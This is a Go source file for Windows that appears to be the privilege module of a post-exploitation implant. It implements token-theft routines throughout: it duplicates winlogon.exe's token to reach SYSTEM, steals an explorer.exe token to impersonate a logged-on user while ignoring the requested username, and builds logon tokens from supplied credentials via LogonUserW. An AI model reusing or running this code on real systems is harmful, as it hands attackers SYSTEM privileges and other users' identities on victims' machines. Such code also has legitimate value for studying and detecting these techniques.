// +build windows

package privilege

import (
	"fmt"
	"runtime"
	"unsafe"

	"golang.org/x/sys/windows"
)

// PrivilegeEscalation handles privilege escalation operations
type PrivilegeEscalation struct {
	logger interface {
		Info(string, ...interface{})
		Debug(string, ...interface{})
		Error(string, ...interface{})
	}
}

// NewPrivilegeEscalation creates a new privilege escalation handler
func NewPrivilegeEscalation(logger interface {
	Info(string, ...interface{})
	Debug(string, ...interface{})
	Error(string, ...interface{})
}) *PrivilegeEscalation {
	return &PrivilegeEscalation{logger: logger}
}

// GetSystem elevates to SYSTEM privilege
func (pe *PrivilegeEscalation) GetSystem(hostingProcess string) error {
	switch runtime.GOOS {
	case "windows":
		return pe.getSystemWindows(hostingProcess)
	default:
		return fmt.Errorf("GetSystem not supported on %s", runtime.GOOS)
	}
}

// ImpersonateUser steals a user token and impersonates that user
func (pe *PrivilegeEscalation) ImpersonateUser(username string) error {
	switch runtime.GOOS {
	case "windows":
		return pe.impersonateUserWindows(username)
	default:
		return fmt.Errorf("ImpersonateUser not supported on %s", runtime.GOOS)
	}
}

// MakeToken creates a new token with credentials
func (pe *PrivilegeEscalation) MakeToken(username, domain, password string) error {
	switch runtime.GOOS {
	case "windows":
		return pe.makeTokenWindows(username, domain, password)
	default:
		return fmt.Errorf("MakeToken not supported on %s", runtime.GOOS)
	}
}

// Platform-specific implementations
func (pe *PrivilegeEscalation) getSystemWindows(hostingProcess string) error {
	if runtime.GOOS != "windows" {
		return fmt.Errorf("Windows privilege escalation only supported on Windows")
	}

	pe.logger.Info("Elevating to SYSTEM using process: %s", hostingProcess)

	// Find SYSTEM process (usually winlogon.exe or services.exe)
	// Default to winlogon.exe if not specified
	if hostingProcess == "" {
		hostingProcess = "winlogon.exe"
	}

	// Get process ID of hosting process
	pid, err := pe.findProcessByName(hostingProcess)
	if err != nil {
		return fmt.Errorf("failed to find process: %w", err)
	}

	pe.logger.Debug("Found hosting process PID: %d", pid)

	// Open process with PROCESS_QUERY_INFORMATION
	processHandle, err := windows.OpenProcess(
		windows.PROCESS_QUERY_INFORMATION,
		false,
		uint32(pid),
	)
	if err != nil {
		return fmt.Errorf("failed to open process: %w", err)
	}
	defer windows.CloseHandle(processHandle)

	// Open process token
	var tokenHandle windows.Handle
	err = windows.OpenProcessToken(
		processHandle,
		windows.TOKEN_DUPLICATE|windows.TOKEN_QUERY,
		&tokenHandle,
	)
	if err != nil {
		return fmt.Errorf("failed to open process token: %w", err)
	}
	defer windows.CloseHandle(tokenHandle)

	// Duplicate token with impersonation privileges
	var duplicatedToken windows.Handle
	err = windows.DuplicateTokenEx(
		tokenHandle,
		windows.MAXIMUM_ALLOWED,
		nil,
		windows.SecurityImpersonation,
		windows.TokenPrimary,
		&duplicatedToken,
	)
	if err != nil {
		return fmt.Errorf("failed to duplicate token: %w", err)
	}
	defer windows.CloseHandle(duplicatedToken)

	// Impersonate the token
	err = windows.ImpersonateLoggedOnUser(duplicatedToken)
	if err != nil {
		return fmt.Errorf("failed to impersonate token: %w", err)
	}

	pe.logger.Info("Successfully elevated to SYSTEM")
	return nil
}

func (pe *PrivilegeEscalation) impersonateUserWindows(username string) error {
	if runtime.GOOS != "windows" {
		return fmt.Errorf("Windows impersonation only supported on Windows")
	}

	pe.logger.Info("Impersonating user: %s", username)

	// Find process owned by target user
	pid, err := pe.findProcessByName("explorer.exe") // Default to explorer.exe
	if err != nil {
		return fmt.Errorf("failed to find process: %w", err)
	}

	// Open process
	processHandle, err := windows.OpenProcess(
		windows.PROCESS_QUERY_INFORMATION,
		false,
		uint32(pid),
	)
	if err != nil {
		return fmt.Errorf("failed to open process: %w", err)
	}
	defer windows.CloseHandle(processHandle)

	// Open process token
	var tokenHandle windows.Handle
	err = windows.OpenProcessToken(
		processHandle,
		windows.TOKEN_DUPLICATE|windows.TOKEN_QUERY,
		&tokenHandle,
	)
	if err != nil {
		return fmt.Errorf("failed to open process token: %w", err)
	}
	defer windows.CloseHandle(tokenHandle)

	// Impersonate the token
	err = windows.ImpersonateLoggedOnUser(tokenHandle)
	if err != nil {
		return fmt.Errorf("failed to impersonate token: %w", err)
	}

	pe.logger.Info("Successfully impersonated user")
	return nil
}

func (pe *PrivilegeEscalation) makeTokenWindows(username, domain, password string) error {
	if runtime.GOOS != "windows" {
		return fmt.Errorf("Windows token creation only supported on Windows")
	}

	pe.logger.Info("Creating token for user: %s\\%s", domain, username)

	advapi32 := windows.NewLazySystemDLL("advapi32.dll")
	logonUser := advapi32.NewProc("LogonUserW")

	// Convert strings to UTF16
	usernamePtr, _ := windows.UTF16PtrFromString(username)
	domainPtr, _ := windows.UTF16PtrFromString(domain)
	passwordPtr, _ := windows.UTF16PtrFromString(password)

	var tokenHandle windows.Handle
	const LOGON32_LOGON_INTERACTIVE = 2
	const LOGON32_PROVIDER_DEFAULT = 0

	ret, _, err := logonUser.Call(
		uintptr(unsafe.Pointer(usernamePtr)),
		uintptr(unsafe.Pointer(domainPtr)),
		uintptr(unsafe.Pointer(passwordPtr)),
		LOGON32_LOGON_INTERACTIVE,
		LOGON32_PROVIDER_DEFAULT,
		uintptr(unsafe.Pointer(&tokenHandle)),
	)

	if ret == 0 {
		return fmt.Errorf("LogonUser failed: %w", err)
	}

	// Impersonate the token
	err = windows.ImpersonateLoggedOnUser(tokenHandle)
	if err != nil {
		windows.CloseHandle(tokenHandle)
		return fmt.Errorf("failed to impersonate token: %w", err)
	}

	pe.logger.Info("Successfully created and impersonated token")
	windows.CloseHandle(tokenHandle)
	return nil
}

// findProcessByName finds a process ID by name
func (pe *PrivilegeEscalation) findProcessByName(name string) (uint32, error) {
	snapshot, err := windows.CreateToolhelp32Snapshot(windows.TH32CS_SNAPPROCESS, 0)
	if err != nil {
		return 0, err
	}
	defer windows.CloseHandle(snapshot)

	var entry windows.ProcessEntry32
	entry.Size = uint32(unsafe.Sizeof(entry))

	err = windows.Process32First(snapshot, &entry)
	if err != nil {
		return 0, err
	}

	for {
		processName := windows.UTF16ToString(entry.ExeFile[:])
		if processName == name {
			return entry.ProcessID, nil
		}

		err = windows.Process32Next(snapshot, &entry)
		if err != nil {
			break
		}
	}

	return 0, fmt.Errorf("process not found: %s", name)
}

